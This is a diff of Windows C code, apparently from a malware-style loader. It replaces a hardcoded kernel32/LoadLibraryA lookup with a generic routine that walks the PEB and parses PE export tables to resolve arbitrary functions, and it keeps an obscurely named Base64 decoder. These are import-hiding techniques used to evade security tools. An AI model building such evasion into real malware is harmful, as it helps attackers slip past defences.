@@ -83,27 +83,6 @@ void SetSyid(DWORD value) {
     smID = value;
 }
 
-FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
-    HMODULE hMod = GetModuleHandle(mod);
-    if (!hMod) return NULL;
-
-    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)hMod;
-    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dosHdr->e_lfanew);
-    IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-    DWORD* names = (DWORD*)((BYTE*)hMod + expDir->AddressOfNames);
-    WORD* ords = (WORD*)((BYTE*)hMod + expDir->AddressOfNameOrdinals);
-    DWORD* funcs = (DWORD*)((BYTE*)hMod + expDir->AddressOfFunctions);
-
-    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
-        LPCSTR currFn = (LPCSTR)((BYTE*)hMod + names[i]);
-        if (strcmp(currFn, fn) == 0) {
-            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
-        }
-    }
-    return NULL;
-}
-
 // Function to Base64 Decode
 char* Bsfd(const char* encoded) {
     DWORD outLen = 0;
@@ -128,7 +107,7 @@ char* Bsfd(const char* encoded) {
     return (char*)decoded;
 }
 
-pLoadLibraryA GetLoadLibraryA() {
+pMod GetMod(LPCSTR mod, LPCSTR fn) {
     PPEB pPEB = (PPEB)__readgsqword(0x60);
     if (!pPEB) {
         printf("[!] Failed to retrieve PEB.\n");
@@ -165,9 +144,8 @@ pLoadLibraryA GetLoadLibraryA() {
             dllName[i] = tolower(dllName[i]);
         }
 
-        // Check if this is kernel32.dll
-        if (strstr(dllName, "kernel32.dll")) {
-            printf("[*] Found kernel32.dll at: %p\n", hModuleBase);
+        if (strstr(dllName, mod)) {
+            printf("[*] Found %s at: %p\n", mod, hModuleBase);
 
             // Locate Export Directory
             IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModuleBase;
@@ -185,20 +163,19 @@ pLoadLibraryA GetLoadLibraryA() {
 
             for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
                 LPCSTR functionName = (LPCSTR)((BYTE*)hModuleBase + names[i]);
-                if (strcmp(functionName, "LoadLibraryA") == 0) {
-                    printf("[*] LoadLibraryA found at: %p\n", (BYTE*)hModuleBase + functions[ordinals[i]]);
-                    return (pLoadLibraryA)((BYTE*)hModuleBase + functions[ordinals[i]]);
+                if (strcmp(functionName, fn) == 0) {
+                    printf("[*] %s found at: %p\n", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
+                    return (pMod)((BYTE*)hModuleBase + functions[ordinals[i]]);
                 }
             }
 
-            printf("[!] LoadLibraryA not found in kernel32 exports.\n");
+            printf("[!] %s not found in %s exports.\n", fn, mod);
             return NULL;
         }
 
         pEntry = pEntry->Flink;
     }
 
-    printf("[!] Kernel32.dll not found in PEB.\n");
+    printf("[!] %s not found in PEB.\n", mod);
     return NULL;
 }
-
